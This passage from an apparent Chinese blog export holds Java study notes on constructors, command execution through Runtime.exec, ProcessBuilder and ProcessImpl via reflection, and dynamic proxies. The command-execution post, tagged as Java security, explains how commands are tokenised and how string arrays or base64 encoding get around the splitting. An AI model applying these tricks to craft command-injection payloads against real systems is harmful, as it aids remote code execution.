&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303220105149.png" alt="image-20210303215334875"></p>
<h4 id="不使用构造函数复制值"><a href="#不使用构造函数复制值" class="headerlink" title="不使用构造函数复制值"></a>不使用构造函数复制值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span>&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    S(<span class="type">int</span> i, String n)&#123;</span><br><span class="line">        id = i;</span><br><span class="line">        name = n;</span><br><span class="line">    &#125;</span><br><span class="line">    S()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dispaly</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(id+<span class="string">&quot; : &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cst6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">S</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>(<span class="number">1</span>, <span class="string">&quot;Kry&quot;</span>);</span><br><span class="line">        <span class="type">S</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line"></span><br><span class="line">        s2.id = s1.id;</span><br><span class="line">        s2.name = s1.name;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;s1: &quot;</span>+ s1.id + <span class="string">&quot; - &quot;</span> + s1.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;s2: &quot;</span>+ s2.id + <span class="string">&quot; - &quot;</span> + s2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303215334875.png" alt="image-20210303220105149"></p>
<p>注意：构造函数返回当前类的实例，它不能指定返回值，但是他会返回值</p>
]]></content>
  </entry>
  <entry>
    <title>Java 命令执行</title>
    <url>/2023/06/23/Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h3 id="Runtime-命令执行"><a href="#Runtime-命令执行" class="headerlink" title="Runtime 命令执行"></a>Runtime 命令执行</h3><p><code>java.lang.Runtime</code>类的<code>exec</code>方法来进行命令执行</p>
<span id="more"></span>
<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime.exec(<span class="string">&quot;cmd&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>实际上Runtime类的exec的重载方法：</p>
<ul>
<li><code>exec(String)</code></li>
<li><code>exec(String, String[])</code></li>
<li><code>exec(String, String[], File)</code></li>
<li><code>exec(String[])</code></li>
<li><code>exec(String[], String[])</code></li>
<li><code>exec(String[], Srting[], File)</code></li>
</ul>
<h5 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;java --version&quot;</span>).getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((size = ins.read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            bos.write(bytes, <span class="number">0</span>, size);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210320204309232.png" alt="image-20210320204309232"></p>
<h3 id="反射Runtime命令执行"><a href="#反射Runtime命令执行" class="headerlink" title="反射Runtime命令执行"></a>反射Runtime命令执行</h3><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><h6 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>

<h5 id="eg-1"><a href="#eg-1" class="headerlink" title="eg"></a>eg</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">process_builder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;whoami&quot;</span>).start().getInputStream();</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span>((size = ins.read(bytes))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                bos.write(bytes, <span class="number">0</span>, size);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(bos.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210320215355892.png" alt="image-20210320212320932"></p>
<h3 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h3><p><code>ProcessImpl</code>是更为底层的实现，Runtime和ProcessBuilder实际上也是调用了<code>ProcessImpl</code>这个类，对于<code>ProcessImpl</code>类不能直接调用，而需要使用<code>反射来间接调用</code>从而达到目的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder.Redirect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImpl_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ipconfig&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">while</span> ((size = e.getInputStream().read(bytes))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            bos.write(bytes, <span class="number">0</span>, size);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210320212320932.png" alt="image-20210320215355892"></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在windows之中，命令预设要加 <code>cmd /c</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime_test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;cmd /C echo 1 &gt; C:/Users/Brynn/Desktop/1.txt&quot;</span>;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;gbk&quot;</span>)));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321205930958.png" alt="image-20210321205930958"></p>
<ul>
<li><p>跟进exec()函数java.lang.Runtime</p>
<p>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215318249.png" alt="image-20210321215318249"></p>
</li>
<li><p>先判断command命令是否为空，然后经过StringTokenizer 类</p>
<p>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215614218.png" alt="image-20210321215333420"></p>
</li>
<li><p>经过StringTokenizer类之后返回了一个以空格分隔的数组</p>
<p>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215510797.png" alt="image-20210321215510797"></p>
</li>
<li><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215758462.png" alt="image-20210321215614218"></p>
<p>  <code>Process.Builder.start</code>方法是命令执行，继续跟进start()</p>
</li>
<li><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321221347217.png" alt="image-20210321215758462"><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215333420.png" alt="image-20210321215927223">cmdarray拿到可执行文件之后，判断security是否为null，如果不为null，则会校验checkExec()</p>
</li>
<li><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321222812198.png" alt="image-20210321221347217">接下来就进入到<code>ProcessIpl.start</code></p>
</li>
</ul>
<p><strong>也就是说Runtime和ProcessBuilder的底层都是<code>ProcessImpl</code></strong></p>
<p>而无法执行<code>echo命令</code>的原因是java没有这个环境变量。加上<code>cmd /c</code>就可以解决这个问题</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>类似的，在Linux下，如果将类似于<code>/bin/sh -c &quot;echo 111 &gt; 2.txt&quot;</code></p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321215927223.png" alt="image-20210321222407826"></p>
<p><code>StringTokenizer</code>会根据空格将命令划分为数组，按照上面的例子就是：<code>/bin/sh</code>，<code>-c</code>，<code>&quot;echo</code>，<code>111</code>，<code>&gt;</code>，<code>2.txx&quot;</code></p>
<p>命令就会失效</p>
<h4 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h4><ul>
<li><p>在ProcessBuilder中有几个构造方法，当传入字符串会分割为数组</p>
<p>  <img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210321222407826.png" alt="image-20210321222812198"></p>
<p>  但是由于传入的是<code>字符串数组</code>的时候，就会直接<code>this.command=command</code>，即避免在<code>StringTokenizer</code>被分隔的问题</p>
</li>
<li><p>也可以使用<code>base64</code>的编码方式进行绕过</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 动态代理</title>
    <url>/2022/05/03/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/Java%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>代理模式是常见的一种java设计模式，特征是代理类和委托类实现了同样的接口，代理类主要负责委托类预处理，过滤，转发以及时候处理等等。</p>
<span id="more"></span>

<p>实现代理模式常见的方法有：</p>
<ul>
<li>代理类关联目标对象，实现目标对象实现的接口</li>
<li>代理类继承目标类，重写需要代理的方法</li>
</ul>
<h5 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h5><p>如果代理类在程序运行前就已经存在，那么这种代理方式被称为静态代理，在这种情况下的代理通常是Java代码之中定义的。</p>
<p>静态代理的局限在运行前必须编写好代理类</p>
<h5 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h5><p>代理类在<code>程序运行时创建的代理方式</code>被称为动态代理。也就是说，代理类并不是在Java代码之中定义的，而是在运行时根据在Java代码中的”指示”动态生成。</p>
<hr>
<p>如果为特定类的特定方法生成固定的代理，那么使用<code>静态代理</code>就可以较好地满足需求</p>
<p>如果为大量不同类的不同方法生成代理，使用静态代理就需要编写大量的代理类，且大量代码冗余，此时使用动态代理是一个很好的选择。</p>
<h2 id="Java-动态代理"><a href="#Java-动态代理" class="headerlink" title="Java 动态代理"></a>Java 动态代理</h2><p><code>Java</code>反射提供了一种类动态代理机制，可以通过代理接口实现类来完成程序无侵入式扩展。</p>
<p>可以使用<code>Proxy.newProxyInstance()</code>来创建动态类实例，或者使用<code>Proxy.getProxyClass()</code>获取代理类对象的方式来创建</p>
<h5 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h5><p><code>hungry.java</code>: 接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic_agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">hungry</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">calllunch</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>roommate.java</code>: hungry接口的实现类，也就是委托类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic_agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">roommate</span> <span class="keyword">implements</span> <span class="title class_">hungry</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">roommate</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">calllunch</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call for lunch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>roommate_invocation_handler.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic_agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">roommate_invocation_handler</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="comment">//InvocationHandler 是一个接口，是由实例内部的invocation handler实现的接口</span></span><br><span class="line">    <span class="keyword">private</span> T rommate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">roommate_invocation_handler</span><span class="params">(T rommate)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.rommate = rommate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Looking forward coupons&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(rommate, args);</span><br><span class="line">        <span class="comment">//当代理实例上调用方法的时候，method.invoke(baseImp, args)这个方法将被编码并植入到代理实例内部的invocation handler 实现的invoke方法</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用proxy的方式实现动态代理，调用委托类接口的方法，完成calllunch</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">roommate</span> <span class="variable">rm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">roommate</span>(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">hungry</span> <span class="variable">proxyInstancce</span> <span class="operator">=</span> (hungry) Proxy.newProxyInstance(</span><br><span class="line">            rm.getClass().getClassLoader(),<span class="comment">//指定动态代理类的类加载器</span></span><br><span class="line">            rm.getClass().getInterfaces(),<span class="comment">//定义动态代理生成的类实现的接口</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">roommate_invocation_handler</span>(rm));<span class="comment">//动态代理处理类</span></span><br><span class="line">        <span class="comment">//代理实例proxyInstancce的类型是hungry，所以只能调用hungry之中的方法，roommate作为接口实现类，不是来自接口的其他方法，是无法通过代理调用的</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">roommate_invocation_handler</span>(rm);</span><br><span class="line">        proxyInstancce.calllunch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210418172003385.png" alt="image-20210418170029661"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>动态代理的实现原理</p>
<p>从 <code>Proxy.newProxyInstance</code>入手，分析<code>InvocationHandler</code>如何建立代理实例和委托实例</p>
<ul>
<li>通过类加载器和委托类窗口，在内存中找出或者生成指定的代理类</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210418170029661.png"></p>
<ul>
<li>利用指定的invocation handler调用他的构造器方法，构造代理类的实例返回</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210418172245664.png" alt="image-20210418172245664"></p>
<ul>
<li><p>在上面的main代码中补充，利用<code>ProxyGenerator.generateProxyClass</code>生成这个动态生成的类文件，写入指定路径的class文件之中</p>
<p>  这里需要注意的是，jdk的版本，如果直接引入<code>ProxyGenerator类</code>不能成功，需要改用<code>jdk8</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] classFile = ProxyGenerator.generateProxyClass(<span class="string">&quot;$Proxy0&quot;</span>,Roommate.class.getInterfaces());</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;D:\Code\Java\proxy\src\dynamic_agent\roommateProxy.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath)) &#123;</span><br><span class="line">            fos.write(classFile);</span><br><span class="line">            fos.flush();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;error：写入文件&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>反编译这个class文件得到</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"><span class="keyword">import</span> dynamic_agent.hungry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">hungry</span>&#123;</span><br><span class="line">    <span class="comment">//在构建$Proxy0这个类，会调用父类Proxy的方法</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m3; <span class="comment">//由下方静态代码块得知，m3代表callLunch()这一个方法</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  父类Proxy的构造器，其中 h 属性为 InvocationHandler引用</span></span><br><span class="line"><span class="comment">  protected Proxy(InvocationHandler h) &#123;</span></span><br><span class="line"><span class="comment">        Objects.requireNonNull(h);</span></span><br><span class="line"><span class="comment">        this.h = h;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> $Proxy0(</span><br><span class="line">      InvocationHandler paramInvocationHandler) <span class="keyword">throws</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(paramInvocationHandler);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">//可供外界调用，方法名与委托类实现接口的方法相同，利用 InvocationHandler调用invoke</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">callLunch</span><span class="params">()</span> <span class="keyword">throws</span> &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.h.invoke(<span class="built_in">this</span>, m3, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//由于h属性其实是InvocationHandler引用，调用了他的invoke就会导致roommateInvocationHandler类的重写过的invoke方法也就被调用过了</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Error|RuntimeException localError)&#123;</span><br><span class="line">      <span class="keyword">throw</span> localError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable localThrowable)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(localThrowable);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object paramObject)</span> <span class="keyword">throws</span> &#123;&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span> &#123;...&#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span> &#123;...&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>) &#125;);</span><br><span class="line">      m3 = Class.forName(<span class="string">&quot;dynamic_agent.hungry&quot;</span>).getMethod(<span class="string">&quot;calllunch&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">      m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">      m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NoSuchMethodException localNoSuchMethodException)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(localNoSuchMethodException.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassNotFoundException localClassNotFoundException)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(localClassNotFoundException.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Java的继承机制是<code>单继承，多接口</code>，代理类因为必须需要继承Proxy类，所以java的动态代理只能对接口进行处理，无法对一个class类进行处理。</p>
<hr>
<ul>
<li><p>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(反射机制)</p>
</li>
<li><p>动态代理类会会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>来创建</p>
</li>
<li><p><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并且调用<code>java.lang.reflect.Proxy.defineClass()</code>方法将该类注册到JVM</p>
</li>
<li><p>该类继承于<code>Java.lang.reflect.Proxy</code>并且实现了需要被代理的接口类</p>
</li>
</ul>
